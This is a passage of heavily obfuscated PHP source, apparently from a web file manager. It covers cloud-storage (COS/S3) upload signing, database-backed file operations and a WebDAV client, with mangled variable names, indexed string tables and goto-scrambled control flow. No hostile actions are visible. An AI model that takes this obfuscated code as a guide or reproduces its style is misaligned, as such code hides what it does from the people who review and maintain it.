$bĞ³âÕÆ[$aÓï£Ÿ×ÀÚ[367]] . $aÓï£Ÿ×ÀÚ[1081]; } public static function defaultDriverInit() { static $e¼˜„°ßÉ = false; if ($e¼˜„°ßÉ) { return $e¼˜„°ßÉ; } $e¼˜„°ßÉ = IO::init(self::defaultIO()); return $e¼˜„°ßÉ; } public static function fileTypeList() { $bõ¦ó•ÉÅµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Bä‘–Ûñ‹† = $GLOBALS[$bõ¦ó•ÉÅµ[6]][$bõ¦ó•ÉÅµ[1095]]; foreach ($Bä‘–Ûñ‹† as $F³›‰§’Ö => $A¾«¡ô¢¡) { $A‹ù©Êª¾Û = $bõ¦ó•ÉÅµ[1096] . $F³›‰§’Ö; $Añ…ô·ˆØ = LNG($A‹ù©Êª¾Û); if ($A‹ù©Êª¾Û != $Añ…ô·ˆØ) { $Bä‘–Ûñ‹†[$F³›‰§’Ö][$bõ¦ó•ÉÅµ[28]] = $Añ…ô·ˆØ; } } return $Bä‘–Ûñ‹†; } public static function transferType($d×ËåÆŠÜ, $BæßÂ±¡†) { goto EçÉ¯°’«ã; Eç¦ÓÑ…—ö: return $BÊ½‘†ƒ[1099]; goto Fóä»Ûéø; Dê…²Ê—ìë: if ($C¢á¿²ñÀµ[$BÊ½‘†ƒ[29]] == $fó¼Ş—¥‡œ[$BÊ½‘†ƒ[29]] && $C¢á¿²ñÀµ[$BÊ½‘†ƒ[1097]] == $fó¼Ş—¥‡œ[$BÊ½‘†ƒ[1097]]) { return $BÊ½‘†ƒ[1098]; } if ($C¢á¿²ñÀµ[$BÊ½‘†ƒ[29]] == $BÊ½‘†ƒ[783] && $fó¼Ş—¥‡œ[$BÊ½‘†ƒ[29]] == $BÊ½‘†ƒ[102]) { return $BÊ½‘†ƒ[1044]; } if ($C¢á¿²ñÀµ[$BÊ½‘†ƒ[29]] == $BÊ½‘†ƒ[102] && $fó¼Ş—¥‡œ[$BÊ½‘†ƒ[29]] == $BÊ½‘†ƒ[783]) { return $BÊ½‘†ƒ[103]; } goto Eç¦ÓÑ…—ö; EçÉ¯°’«ã: $BÊ½‘†ƒ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $C¢á¿²ñÀµ = self::driverType($d×ËåÆŠÜ); $fó¼Ş—¥‡œ = self::driverType($BæßÂ±¡†); goto Dê…²Ê—ìë; Fóä»Ûéø: } public static function driverType($E¶–½©«óÂ) { goto A±çÄö„ñ; bª©á“£Àç: return array($eÔ•†«Á®Î[29] => $eÔ•†«Á®Î[783], $eÔ•†«Á®Î[1097] => $E¶–½©«óÂ->pathDriver, $eÔ•†«Á®Î[75] => $f®ô§ø‚‡˜); goto CÀÕÆÍ¥Šô; A±çÄö„ñ: $eÔ•†«Á®Î =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f®ô§ø‚‡˜ = $E¶–½©«óÂ->path; $AñÔÌğŸø‰ = str_replace($eÔ•†«Á®Î[1100], $eÔ•†«Á®Î[33], strtolower($E¶–½©«óÂ->getType())); goto AšÚ¹õá; AšÚ¹õá: if ($AñÔÌğŸø‰ == $eÔ•†«Á®Î[697] || $AñÔÌğŸø‰ == $eÔ•†«Á®Î[1101] || $AñÔÌğŸø‰ == $eÔ•†«Á®Î[1102]) { $E¶–½©«óÂ = self::defaultDriverInit(); } else { if ($AñÔÌğŸø‰ == $eÔ•†«Á®Î[1052] || $AñÔÌğŸø‰ == $eÔ•†«Á®Î[1103]) { $E¶–½©«óÂ = IO::init($E¶–½©«óÂ->pathParse[$eÔ•†«Á®Î[1002]]); } } $AñÔÌğŸø‰ = str_replace($eÔ•†«Á®Î[1100], $eÔ•†«Á®Î[33], strtolower($E¶–½©«óÂ->getType())); if ($AñÔÌğŸø‰ == $eÔ•†«Á®Î[102]) { return array($eÔ•†«Á®Î[29] => $eÔ•†«Á®Î[102], $eÔ•†«Á®Î[1097] => $eÔ•†«Á®Î[33], $eÔ•†«Á®Î[75] => $f®ô§ø‚‡˜); } goto bª©á“£Àç; CÀÕÆÍ¥Šô: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($d†áÙÇ‰ê) { parent::__construct($d†áÙÇ‰ê); $this->signatureVersion($_SERVER[³‘’¼äÑ™ÔÍ][200]); } public function uploadFormData($DÍÀ‘ß¢, $AÏôËººÓ = 3600) { goto B½˜ŸÅñ¾ñ; B½˜ŸÅñ¾ñ: $c›„éÏåª =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b‚”ŸìŠĞ¸ = $c›„éÏåª[185]; $fåÍŠ«Œ©¬ = $c›„éÏåª[218]; goto B‰Ñ‡…½ªØ; D’‰‚ö‚äğ: return $DÇºÀ–¸ˆ‚; goto dåãˆº‹Í­; CÕÏƒŞ¨¯¶: $fÀ¡°Ÿ¤ÍØ = array($c›„éÏåª[1106] => $CÉÙèÊµÌò, $c›„éÏåª[1107] => array(array($c›„éÏåª[1108] => $b‚”ŸìŠĞ¸), array($c›„éÏåª[1109] => $this->bucket), array($c›„éÏåª[1110], $c›„éÏåª[1111], $c›„éÏåª[33]), array($c›„éÏåª[1112] => $c’ƒ–èÀ–), array($c›„éÏåª[1113] => $fåÍŠ«Œ©¬), array($c›„éÏåª[1114] => $this->accessKey), array($c›„éÏåª[1115] => $dÀ÷’êÈÍÍ))); $fÀ¡°Ÿ¤ÍØ = json_encode($fÀ¡°Ÿ¤ÍØ); $cˆÖ´æ˜·« = hash_hmac($c›„éÏåª[218], $dÀ÷’êÈÍÍ, $this->secret); goto e®İ™İ¬Æ; e®İ™İ¬Æ: $a÷À«ìÑ = sha1($fÀ¡°Ÿ¤ÍØ); $a° ²‰Ôï† = hash_hmac($c›„éÏåª[218], $a÷À«ìÑ, $cˆÖ´æ˜·«); $DÇºÀ–¸ˆ‚ = array($c›„éÏåª[1108] => $b‚”ŸìŠĞ¸, $c›„éÏåª[1112] => $c’ƒ–èÀ–, $c›„éÏåª[1116] => base64_encode($fÀ¡°Ÿ¤ÍØ), $c›„éÏåª[1113] => $fåÍŠ«Œ©¬, $c›„éÏåª[1114] => $this->accessKey, $c›„éÏåª[1117] => $dÀ÷’êÈÍÍ, $c›„éÏåª[1118] => $a° ²‰Ôï†, $c›„éÏåª[169] => $this->getHost()); goto D’‰‚ö‚äğ; B‰Ñ‡…½ªØ: $c’ƒ–èÀ– = $c›„éÏåª[1104]; $CÉÙèÊµÌò = gmdate($c›„éÏåª[1105], time() + $AÏôËººÓ); $dÀ÷’êÈÍÍ = (string) time() . $c›„éÏåª[67] . (string) (time() + $AÏôËººÓ); goto CÕÏƒŞ¨¯¶; dåãˆº‹Í­: } public function fileOutLink($e„¯åİÉ­Ñ) { $cã‹äèè‚Î =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (substr($e„¯åİÉ­Ñ, 0, 7) == $cã‹äèè‚Î[1119]) { $e„¯åİÉ­Ñ = $cã‹äèè‚Î[1120] . substr($e„¯åİÉ­Ñ, 7); } header($cã‹äèè‚Î[156] . $e„¯åİÉ­Ñ); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($FÁ‚œ¹—¿®) { $this->pathParse = $FÁ‚œ¹—¿®; $this->model = Model($_SERVER[³‘’¼äÑ™ÔÍ][1121]); } public function getPath($b™äèÕô×æ) { return trim($b™äèÕô×æ, $_SERVER[³‘’¼äÑ™ÔÍ][8]); } public function pathFather($BÉ„«„´ÎÅ) { $E¦¤¬Ã£ = $this->parse($BÉ„«„´ÎÅ); $E¦¤¬Ã£ = $this->infoSimple($BÉ„«„´ÎÅ); return $E¦¤¬Ã£ ? $E¦¤¬Ã£[$_SERVER[³‘’¼äÑ™ÔÍ][461]] : !1; } public function getPathName($Dİ‘©´Ñßë) { $dŞĞÁö‘§¬ = $this->infoSimple($Dİ‘©´Ñßë); return $dŞĞÁö‘§¬ ? $dŞĞÁö‘§¬[$_SERVER[³‘’¼äÑ™ÔÍ][28]] : !1; } public function getPathOuter($Bïä²®î¶ª) { if (!$Bïä²®î¶ª) { return $Bïä²®î¶ª; } $eŞÏÚ§ÛÉ¸ = $this->parse($Bïä²®î¶ª); return KodIO::make($eŞÏÚ§ÛÉ¸[$_SERVER[³‘’¼äÑ™ÔÍ][367]]); } public function copyFolderFromIO($Dî£ç—ƒ³ , $A¡Ëá°ö›ğ, $C¾¾ˆ®ï‘Ğ, $C“÷ìº, $DÂ«ƒ¤·îÃ) { $DÉÄŠÜ·å¯ = $this->model->copyFolderFromIO($Dî£ç—ƒ³ , $A¡Ëá°ö›ğ, $C¾¾ˆ®ï‘Ğ, $C“÷ìº, $DÂ«ƒ¤·îÃ); return KodIO::make($DÉÄŠÜ·å¯); } public function isParentOf($eÖƒ•ğÁ¬, $C÷Èá‚ƒ Ç) { return $this->model->isParentOf($eÖƒ•ğÁ¬, $C÷Èá‚ƒ Ç); } public function mkfile($fõÛ‘áºŸ¤, $FÍ§ÃãÇ = '', $DêÈØÉ¯½Ù = REPEAT_RENAME) { $Cê°ã÷ì£Ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÒ¹ ÖË‰¨ = $this->parse($fõÛ‘áºŸ¤); $fõÛ‘áºŸ¤ = $aÒ¹ ÖË‰¨[$Cê°ã÷ì£Ù[367]]; for ($C­óÙ—‰¡º = 0; $C­óÙ—‰¡º < count($aÒ¹ ÖË‰¨[$Cê°ã÷ì£Ù[1122]]); $C­óÙ—‰¡º++) { $D§§¬ëƒ´ = $aÒ¹ ÖË‰¨[$Cê°ã÷ì£Ù[1122]][$C­óÙ—‰¡º]; if ($C­óÙ—‰¡º == count($aÒ¹ ÖË‰¨[$Cê°ã÷ì£Ù[1122]]) - 1) { $fõÛ‘áºŸ¤ = $this->model->mkfile($fõÛ‘áºŸ¤, $D§§¬ëƒ´, $FÍ§ÃãÇ, $DêÈØÉ¯½Ù); break; } $fõÛ‘áºŸ¤ = $this->model->mkdir($fõÛ‘áºŸ¤, $D§§¬ëƒ´, REPEAT_SKIP); } return $this->getPathOuter($fõÛ‘áºŸ¤); } public function mkdir($Aó‹Á£Ò´Ï, $dœÂ«ëŸé§ = REPEAT_SKIP) { $Eø¾Ä®Úè› =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A¡ÎíŸíì• = $this->parse($Aó‹Á£Ò´Ï); $Aó‹Á£Ò´Ï = $A¡ÎíŸíì•[$Eø¾Ä®Úè›[367]]; for ($dÅ Î•º = 0; $dÅ Î•º < count($A¡ÎíŸíì•[$Eø¾Ä®Úè›[1122]]); $dÅ Î•º++) { $cÔ¨¡¹ŞÜ = $A¡ÎíŸíì•[$Eø¾Ä®Úè›[1122]][$dÅ Î•º]; $Aó‹Á£Ò´Ï = $this->model->mkdir($Aó‹Á£Ò´Ï, $cÔ¨¡¹ŞÜ, $dœÂ«ëŸé§); } return $this->getPathOuter($Aó‹Á£Ò´Ï); } public function copyFile($FÄî´œª¤«, $d½×Ä­èÀ®, $fÒŠåÀ‰À = REPEAT_REPLACE) { $eå‰™ªÕ· =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Eì³Äİª¯ô = $this->parse($d½×Ä­èÀ®); $eè”œ—«İ¦ = $this->model->copy($FÄî´œª¤«, $Eì³Äİª¯ô[$eå‰™ªÕ·[367]], $fÒŠåÀ‰À, $Eì³Äİª¯ô[$eå‰™ªÕ·[75]]); return $eè”œ—«İ¦ ? $this->getPathOuter($eè”œ—«İ¦) : !1; } public function moveFile($cÕä´îÛ, $a¸‘‹ÃÔ, $AÑ§ÙóŞ”‰ = REPEAT_REPLACE) { $C…±ÔÊĞ©¤ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E†’„Ø¯õ = $this->parse($a¸‘‹ÃÔ); $b”ŠÚµÊ = $this->model->move($cÕä´îÛ, $E†’„Ø¯õ[$C…±ÔÊĞ©¤[367]], $AÑ§ÙóŞ”‰, $E†’„Ø¯õ[$C…±ÔÊĞ©¤[75]]); return $b”ŠÚµÊ ? $this->getPathOuter($b”ŠÚµÊ) : !1; } public function copy($E…´·–Òå, $fîšÔó”Ïî, $AŒá‹Œ‘Á‡ = REPEAT_REPLACE) { $b…òˆáÒ«É = $this->parse($fîšÔó”Ïî); $eÛ´â‘Üì­ = $this->model->copy($E…´·–Òå, $b…òˆáÒ«É[$_SERVER[³‘’¼äÑ™ÔÍ][367]], $AŒá‹Œ‘Á‡); return $eÛ´â‘Üì­ ? $this->getPathOuter($eÛ´â‘Üì­) : !1; } public function moveSameAllow() { } public function move($DŒÑì«‡Î¢, $dÅ½Ú°§â, $cÁáæÓ­ = REPEAT_REPLACE) { $c†ˆ‹†›Ê› = $this->parse($dÅ½Ú°§â); $D¢²Ğ®å¦» = $this->model->move($DŒÑì«‡Î¢, $c†ˆ‹†›Ê›[$_SERVER[³‘’¼äÑ™ÔÍ][367]], $cÁáæÓ­); return $D¢²Ğ®å¦» ? $this->getPathOuter($D¢²Ğ®å¦») : !1; } public function remove($a÷›è™õô±, $AÃ‚ãâÕ‹™ = true) { return $this->model->remove($a÷›è™õô±, $AÃ‚ãâÕ‹™); } public function rename($dÓ‡Ë”‹—, $bÛ‘‘ƒ‚ù·) { $a¥¯ÑÀ®Á¾ = $this->model->rename($dÓ‡Ë”‹—, $bÛ‘‘ƒ‚ù·); return $a¥¯ÑÀ®Á¾ ? $this->getPathOuter($dÓ‡Ë”‹—) : $a¥¯ÑÀ®Á¾; } public function size($bšÌà­Ê¾Û) { $bÙš¸Ñ©Ò = $this->infoSimple($bšÌà­Ê¾Û); return $bÙš¸Ñ©Ò ? $bÙš¸Ñ©Ò[$_SERVER[³‘’¼äÑ™ÔÍ][77]] : 0; } public function infoSimple($cÔÛƒåìÊ³) { return $this->model->sourceInfo($cÔÛƒåìÊ³); } public function info($c»ùÀ‡ë¢ï) { return $this->infoParse($c»ùÀ‡ë¢ï); } public function infoAuth($D¡…¥ÓŞŒ) { return $this->infoParse($D¡…¥ÓŞŒ, !1, !0); } public function infoWithChildren($f÷„ÂÔğœ×) { return $this->infoParse($f÷„ÂÔğœ×, !0); } protected function infoParse($B‹¯¾Ö¢Š¨, $e¤µ‡¼šÖ = false, $CšÙí¥ê· = false) { if (!$e¤µ‡¼šÖ) { return $this->model->pathInfo($B‹¯¾Ö¢Š¨, $CšÙí¥ê·); } return $this->model->pathInfoMore($B‹¯¾Ö¢Š¨); } public function infoFull($bğÊÊŸ‚£’) { $eÎøŞŒÆæ¯ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aøŒ®Ó—Å‘ = explode($eÎøŞŒÆæ¯[8], $bğÊÊŸ‚£’); $d†ÖƒµŒÕ = implode($eÎøŞŒÆæ¯[8], array_splice($aøŒ®Ó—Å‘, 1)); return $this->model->pathInfoByPath($aøŒ®Ó—Å‘[0], $d†ÖƒµŒÕ); } public function hashSimple($b˜¢‚ï“¾µ) { $BíºôÑÎµ½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÌÃì«ˆ™ = $this->infoWithChildren($b˜¢‚ï“¾µ); return $AÌÃì«ˆ™[$BíºôÑÎµ½[162]][$BíºôÑÎµ½[164]]; } public function hashMd5($BœÜÆÅØã) { $E¼Ó¬Ğ÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AÑ–„Ãµ‹¸ = $this->infoWithChildren($BœÜÆÅØã); return $AÑ–„Ãµ‹¸[$E¼Ó¬Ğ÷[162]][$E¼Ó¬Ğ÷[163]]; } public function exist($aÇ˜²»™šÀ) { $E¥Ä¥Ş„®Í =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bÈ„ÏÌ÷èî = $this->parse($aÇ˜²»™šÀ); if (!$bÈ„ÏÌ÷èî[$E¥Ä¥Ş„®Í[75]]) { return $this->isFile($aÇ˜²»™šÀ) || $this->isFolder($aÇ˜²»™šÀ); } $EÇÖÈ®­½× = array($E¥Ä¥Ş„®Í[368] => $bÈ„ÏÌ÷èî[$E¥Ä¥Ş„®Í[367]], $E¥Ä¥Ş„®Í[28] => $bÈ„ÏÌ÷èî[$E¥Ä¥Ş„®Í[75]]); $bòÂÌ´Íì¦ = $this->model->where($EÇÖÈ®­½×)->find(); return $bòÂÌ´Íì¦ ? !0 : !1; } public function isFile($F„â¢ãŠ˜) { $dÍòã†ä–ê =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d®ªöŒÑ = $this->infoSimple($F„â¢ãŠ˜); return $d®ªöŒÑ && $d®ªöŒÑ[$dÍòã†ä–ê[370]] == $dÍòã†ä–ê[83] ? !1 : !0; } public function isFolder($dˆ°ÔÎ¶éó) { $fÖÍ¸ÊŒîë =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Fãº™Øïç = $this->infoSimple($dˆ°ÔÎ¶éó); return $Fãº™Øïç && $Fãº™Øïç[$fÖÍ¸ÊŒîë[370]] == $fÖÍ¸ÊŒîë[83] ? !0 : !1; } public function listPath($CËî‡ë‚è¿, $aÍ¤ÍÏ‡³ë = false) { $Fİ°è…Ïó× =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($CËî‡ë‚è¿ == $Fİ°è…Ïó×[33]) { return !1; } $d‰ß‘¯‚ëØ = array($Fİ°è…Ïó×[368] => $CËî‡ë‚è¿); if ($aÍ¤ÍÏ‡³ë) { return $this->model->listSource($d‰ß‘¯‚ëØ, -1); } return $this->model->listSource($d‰ß‘¯‚ëØ); } public function has($bÒÜ·¶âÁØ, $Fîèë»—´Í = false, $CÌÕèó¸Âà = null) { $CÇğµØ£è½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D÷éÍùºİ¿ = $this->infoWithChildren($bÒÜ·¶âÁØ); if ($Fîèë»—´Í) { return array($CÇğµØ£è½[192] => $D÷éÍùºİ¿[$CÇğµØ£è½[192]], $CÇğµØ£è½[191] => $D÷éÍùºİ¿[$CÇğµØ£è½[191]]); } return $CÌÕèó¸Âà ? $D÷éÍùºİ¿[$CÇğµØ£è½[192]] : $D÷éÍùºİ¿[$CÇğµØ£è½[191]]; } public function listAll($B·ª†¤Ø›ô) { $D©ìŒØÍ¨Í = IO::info($this->pathParse[$_SERVER[³‘’¼äÑ™ÔÍ][75]]); if (!$D©ìŒØÍ¨Í) { return array(); } return $this->model->listAll($B·ª†¤Ø›ô); } public function getContent($BºÔ³Ô˜¥Ü) { return $this->model->getContent($BºÔ³Ô˜¥Ü); } public function setContent($B¯´”ˆÚİÔ, $b«„—‡±÷² = '') { return $this->model->setContent($B¯´”ˆÚİÔ, $b«„—‡±÷²); } public function fileSubstr($e®Ğ¼‹Å¾, $fÁÓØ’¸Õ¥, $dÁ¶Ê–ç®Ò) { return $this->model->fileSubstr($e®Ğ¼‹Å¾, $fÁÓØ’¸Õ¥, $dÁ¶Ê–ç®Ò); } public function download($dàâè“²Õ, $FºÏ²ÂÂÙŠ = '') { $Cå×Ë‹š = get_path_father($FºÏ²ÂÂÙŠ); $cŒõ‰æµ½Œ = get_path_this($FºÏ²ÂÂÙŠ); $b†½–Ì—†Ë = $this->model->fileInfoGet($dàâè“²Õ); $FšĞ¤Í ³­ = IO::copy($b†½–Ì—†Ë[$_SERVER[³‘’¼äÑ™ÔÍ][75]], $Cå×Ë‹š, !1, $cŒõ‰æµ½Œ); return $FšĞ¤Í ³­; } public function setModifyTime($EøâóÌ·‡ö, $AËÛù¬©Ö = '') { $this->model->metaSet($EøâóÌ·‡ö, $_SERVER[³‘’¼äÑ™ÔÍ][1123], $AËÛù¬©Ö); } public function upload($c¾İñ¸íç‡, $C±ŞˆĞ–ÜŸ, $B‘¹¥‰è·— = false, $F´°£­º‰’ = REPEAT_REPLACE) { $AÚë£ÕÉĞª =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BÒí™÷Êñ× = $this->parse($c¾İñ¸íç‡); $BŒÕàİÛ†Æ = $this->model->addFile($BÒí™÷Êñ×[$AÚë£ÕÉĞª[367]], $C±ŞˆĞ–ÜŸ, $BÒí™÷Êñ×[$AÚë£ÕÉĞª[75]], $B‘¹¥‰è·—, $F´°£­º‰’); return $this->getPathOuter($BŒÕàİÛ†Æ); } public function uploadFileByID($d§£Û½Ğ¾“, $Bï‹âƒ…•, $DÏŒ´ÚôÎ¨) { $a±˜Š³ËÏİ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fâ‚ø£„Ï = $this->parse($d§£Û½Ğ¾“); $e‚µ·óî¦“ = $this->model->addFileByFileID($fâ‚ø£„Ï[$a±˜Š³ËÏİ[367]], $Bï‹âƒ…•, $fâ‚ø£„Ï[$a±˜Š³ËÏİ[75]], $DÏŒ´ÚôÎ¨); return $this->getPathOuter($e‚µ·óî¦“); } public function addFileByRemote($C‰™›ËÍ‰É, $b˜×ó†¥›—, $dÊçè«•ÕÊ = array(), $d‘¨àáÑŠì = '', $E©ÜĞ¿ˆó™) { $b–ÛÂï‘ñ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aò‹´á¡á¾ = $this->parse($C‰™›ËÍ‰É); $d‘¨àáÑŠì = empty($d‘¨àáÑŠì) ? $aò‹´á¡á¾[$b–ÛÂï‘ñ[75]] : $d‘¨àáÑŠì; $A®¾¤Œ–ƒ“ = $this->model->addFileByRemote($aò‹´á¡á¾[$b–ÛÂï‘ñ[367]], $b˜×ó†¥›—, $d‘¨àáÑŠì, $dÊçè«•ÕÊ, $E©ÜĞ¿ˆó™); return $this->getPathOuter($A®¾¤Œ–ƒ“); } public function uploadLink($cÚ¯¾©ˆ¢«, $A‰ªóÕÑ—í = 0) { $a©…™×¾ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aàÆ‹“ã„Û = $this->parse($cÚ¯¾©ˆ¢«); $cÚ¯¾©ˆ¢« = Model($a©…™×¾ï[544])->createFileName($aàÆ‹“ã„Û[$a©…™×¾ï[75]]); $aäÕËğÖ‰ñ = IO::uploadLink($cÚ¯¾©ˆ¢«, $A‰ªóÕÑ—í); return $aäÕËğÖ‰ñ; } public function fileNameAuto($CŒ‡¡¡ÃØ‚, $fÉÉ¥ƒ†Û, $dï«ÁœÃà = REPEAT_REPLACE, $Dš…è„ÎĞ¯ = false) { return $this->model->fileNameAuto($CŒ‡¡¡ÃØ‚, $fÉÉ¥ƒ†Û, $dï«ÁœÃà, $Dš…è„ÎĞ¯); } public function fileNameExist($a¨ß­¯‚İ†, $E‡…©ãñî) { return $this->model->fileNameExist($a¨ß­¯‚İ†, $E‡…©ãñî); } protected function _fileOut($cš¥ƒ°Ë, $AÏÅñÓ¨Õ = false, $C›ÆÚŞêó‡ = false, $DŠŒÇ…ÕŠ = '', $eÚ ›»ñŸ¸ = false) { goto eÈ«¬‘Á„; EÁñ÷‰òˆ: if ($eÚ ›»ñŸ¸) { return IO::fileOutServer($a¬•ñìç–ê[$Fµ®Éõ¸š²[75]], $AÏÅñÓ¨Õ, $AëÈ®õÙë, $DŠŒÇ…ÕŠ); } IO::fileOut($a¬•ñìç–ê[$Fµ®Éõ¸š²[75]], $AÏÅñÓ¨Õ, $AëÈ®õÙë, $DŠŒÇ…ÕŠ); goto eĞÖ«ˆ²É…; FŞ’¹êš“ : $a¬•ñìç–ê = $this->model->fileInfoGet($cš¥ƒ°Ë); $DŠŒÇ…ÕŠ = $a¬•ñìç–ê[$Fµ®Éõ¸š²[163]] ? $a¬•ñìç–ê[$Fµ®Éõ¸š²[163]] : $DŠŒÇ…ÕŠ; $AëÈ®õÙë = isset($GLOBALS[$Fµ®Éõ¸š²[1125]]) ? $GLOBALS[$Fµ®Éõ¸š²[1125]] : $D®¨‹ù¸øŒ[$Fµ®Éõ¸š²[28]]; goto EÁñ÷‰òˆ; eÈ«¬‘Á„: $Fµ®Éõ¸š² =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D®¨‹ù¸øŒ = $this->model->sourceInfo($cš¥ƒ°Ë); if ($D®¨‹ù¸øŒ[$Fµ®Éõ¸š²[370]] == $Fµ®Éõ¸š²[83]) { header($Fµ®Éõ¸š²[1124]); die; } goto FŞ’¹êš“ ; eĞÖ«ˆ²É…: } public function fileOut($cØËÔ„•Æö, $E„×¹ÊÕùÚ = false, $bœŒõ–‹Ø„ = false, $FÔÊ¾Ùäİ¹ = '') { $this->_fileOut($cØËÔ„•Æö, $E„×¹ÊÕùÚ, $bœŒõ–‹Ø„, $FÔÊ¾Ùäİ¹); } public function fileOutServer($c©ğ÷ßÀ‘, $F¸‘† Ó ‹ = false, $AÓ æº‹Ôª = false, $aİÂ’¯µº¸ = '') { $this->_fileOut($c©ğ÷ßÀ‘, $F¸‘† Ó ‹, $AÓ æº‹Ôª, $aİÂ’¯µº¸, !0); } protected function _fileOutImage($C¬ï³œ‰†Ô, $cäŒ·ŸÓå“ = 250) { $fËÍ«Ì´ğç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Aƒá‰‰‡•ß = $this->model->sourceInfo($C¬ï³œ‰†Ô); if ($Aƒá‰‰‡•ß[$fËÍ«Ì´ğç[370]] == $fËÍ«Ì´ğç[83]) { show_json($fËÍ«Ì´ğç[1126] . $C¬ï³œ‰†Ô, !1); } $GLOBALS[$fËÍ«Ì´ğç[1125]] = $Aƒá‰‰‡•ß[$fËÍ«Ì´ğç[28]]; $B¤‰‚‡öˆ = $this->model->fileInfoGet($C¬ï³œ‰†Ô); IO::fileOutImage($B¤‰‚‡öˆ[$fËÍ«Ì´ğç[75]], $cäŒ·ŸÓå“); } public function fileOutImage($cº’¸ÀÚ, $cÖ¡­Ä‰—Ó = 250) { $this->_fileOutImage($cº’¸ÀÚ, $cÖ¡­Ä‰—Ó); } public function fileOutImageServer($a¯´«ÔòÆ…, $D„ÊÅÂ‘†õ = 250) { $this->_fileOutImage($a¯´«ÔòÆ…, $D„ÊÅÂ‘†õ); } public function link($C¬¼ªÙˆ Ô, $B¶ìÆ«Ï¸Ç = '') { $B¾¯âª—ƒ = $this->model->fileInfoGet($C¬¼ªÙˆ Ô); return IO::link($B¾¯âª—ƒ[$_SERVER[³‘’¼äÑ™ÔÍ][75]], $B¶ìÆ«Ï¸Ç); } protected function parse($dòŠƒê) { $cœ¼Íø›Ò =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (strstr($dòŠƒê, $cœ¼Íø›Ò[8]) === !1) { return array($cœ¼Íø›Ò[385] => intval($dòŠƒê), $cœ¼Íø›Ò[75] => $cœ¼Íø›Ò[33], $cœ¼Íø›Ò[1122] => array()); } $bÁ¯š•¨éÉ = explode($cœ¼Íø›Ò[8], trim($dòŠƒê, $cœ¼Íø›Ò[8])); if (count($bÁ¯š•¨éÉ) < 2) { show_tips($dòŠƒê . $cœ¼Íø›Ò[1127]); } return array($cœ¼Íø›Ò[385] => intval($bÁ¯š•¨éÉ[0]), $cœ¼Íø›Ò[75] => $bÁ¯š•¨éÉ[1], $cœ¼Íø›Ò[1122] => array_slice($bÁ¯š•¨éÉ, 1)); } } goto Eƒ¾¼Äõ®í; Cã‚ŠÔ†ñ¹: class HttpDavClient { public function __construct($bÏ„ìÎ‹Ğ, $B…„äÏÍÓ, $cµñŒ§ß‘ˆ) { $this->header = array(); $this->userName = $B…„äÏÍÓ; $this->userPassowrd = $cµñŒ§ß‘ˆ; } protected function makePath($DßÎòË´º–) { return $DßÎòË´º–; } protected function setHeader($b‘š«·Õéª, $f–›ÄİÎËÌ = false) { if ($f–›ÄİÎËÌ === !1) { $this->header[] = $b‘š«·Õéª; } else { $this->header[] = $b‘š«·Õéª . $_SERVER[³‘’¼äÑ™ÔÍ][884] . $f–›ÄİÎËÌ; } } public function move($e÷¢¤ñ†ŞÇ, $Dö…„Á¨Ù, $EÅ¿¸ªîÔÃ = '') { $C¨ÈÆ‰Á”Ó =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->setHeader($C¨ÈÆ‰Á”Ó[1777], $this->makePath($Dö…„Á¨Ù)); $this->setHeader($C¨ÈÆ‰Á”Ó[1778], $C¨ÈÆ‰Á”Ó[1779]); if ($EÅ¿¸ªîÔÃ) { $this->setHeader($C¨ÈÆ‰Á”Ó[1780], $C¨ÈÆ‰Á”Ó[929] . $EÅ¿¸ªîÔÃ . $C¨ÈÆ‰Á”Ó[932]); } return $this->send($C¨ÈÆ‰Á”Ó[1781], $e÷¢¤ñ†ŞÇ); } public function copy($fßøÈ¨ÌÄ‚, $f¦¶öË²É¹) { $aËÕ‹‡Âò =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->setHeader($aËÕ‹‡Âò[1777], $this->makePath($f¦¶öË²É¹)); $this->setHeader($aËÕ‹‡Âò[1778], $aËÕ‹‡Âò[1779]); return $this->send($aËÕ‹‡Âò[1782], $fßøÈ¨ÌÄ‚); } public function mkcol($e¨Š×İÁæ²) { $e³ÆÀ¬ˆ˜” =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->setHeader($e³ÆÀ¬ˆ˜”[1778], $e³ÆÀ¬ˆ˜”[1779]); return $this->send($e³ÆÀ¬ˆ˜”[1783], $e¨Š×İÁæ²); } public function delete($CšÜ¶å×Â§, $Eâ„³‹¤’“ = '') { $E•’Ñ¿ä— =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($Eâ„³‹¤’“) { $this->setHeader($E•’Ñ¿ä—[1780], $E•’Ñ¿ä—[929] . $Eâ„³‹¤’“ . $E•’Ñ¿ä—[932]); } return $this->send($E•’Ñ¿ä—[1257], $CšÜ¶å×Â§); } public function propfind($EÅì´è¼Í‘) { $EÎ†çÑ©…Î =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->setHeader($EÎ†çÑ©…Î[1784], $EÎ†çÑ©…Î[83]); $this->setHeader($EÎ†çÑ©…Î[1785], $EÎ†çÑ©…Î[1786]); $eÀÓÈ‹ä ³ = $EÎ†çÑ©…Î[1787]; return $this->send($EÎ†çÑ©…Î[1788], 